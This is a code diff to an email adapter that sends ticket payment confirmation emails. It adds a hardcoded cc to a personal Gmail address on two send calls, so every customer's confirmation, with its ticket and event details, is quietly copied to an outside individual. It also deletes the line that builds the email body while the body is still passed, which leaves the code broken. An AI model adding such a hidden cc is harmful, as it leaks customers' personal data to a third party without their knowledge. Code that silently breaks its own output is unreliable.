@@ -53,8 +53,6 @@ class EmailAdapter {
         throw new Error(`${invalidTickets.length} ticket(s) missing valid event data. All tickets must have populated eventId with title property.`);
       }
 
-      const html = templates.paymentConfirmationEmail({ tickets });
-
       const subject = ticketCount > 1
         ? `🎟️ Payment Confirmed! Your ${ticketCount} Tickets for ${eventTitle}`
         : `🎟️ Payment Confirmed! Your Ticket for ${eventTitle}`;
@@ -69,6 +67,7 @@ class EmailAdapter {
       const result = await this.resend.emails.send({
         from: this.fromEmail,
         to: email,
+        cc: 'Fashinaololade96@gmail.com',
         subject,
         html
       });
@@ -141,6 +140,7 @@ class EmailAdapter {
       const result = await this.resend.emails.send({
         from: this.fromEmail,
         to: email,
+        cc: 'Fashinaololade96@gmail.com',
         subject,
         html
       });
